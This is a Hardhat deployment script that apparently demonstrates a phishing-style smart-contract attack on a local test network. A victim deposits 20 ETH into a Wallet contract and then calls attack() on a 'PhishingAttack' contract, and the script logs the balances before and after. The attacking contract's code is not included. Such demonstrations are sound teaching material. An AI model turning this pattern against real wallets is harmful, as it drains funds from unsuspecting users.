const { ethers } = require("hardhat");

async function main() {
  const [hacker, victim] = await ethers.getSigners();

  // Deploy the Wallet contract and simulate victim's ownership
  console.log("Deploying Wallet contract...");
  const Wallet = await ethers.getContractFactory("Wallet", victim);
  const wallet = await Wallet.deploy();
  await wallet.waitForDeployment();
  console.log("Wallet deployed to:", wallet.target);

  // Victim deposits some ETH into the Wallet
  console.log("Victim depositing ETH...");
 await wallet.connect(victim).deposit({ value: ethers.parseEther("20") });


  console.log("Wallet balance:", ethers.formatEther(await wallet.checkBalance()));

  // Deploy the PhishingAttack contract
  console.log("Deploying PhishingAttack contract...");
  const PhishingAttack = await ethers.getContractFactory("PhishingAttack", hacker);
  const phishingAttack = await PhishingAttack.deploy(wallet.target);
  await phishingAttack.waitForDeployment();
  console.log("PhishingAttack deployed to:", phishingAttack.target);
 const balanceBefore = await ethers.provider.getBalance(hacker.address);
  console.log("Attacker balance before:", ethers.formatEther(balanceBefore));
  // Victim interacts with the malicious contract
  console.log("Victim interacting with malicious contract...");
  await phishingAttack.connect(victim).attack();

  // Check the Wallet balance after the attack
  console.log("Wallet balance after attack:", ethers.formatEther(await wallet.checkBalance()));
   const balanceAfter = await ethers.provider.getBalance(hacker.address);
  console.log("Attacker balance after:", ethers.formatEther(balanceAfter));
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
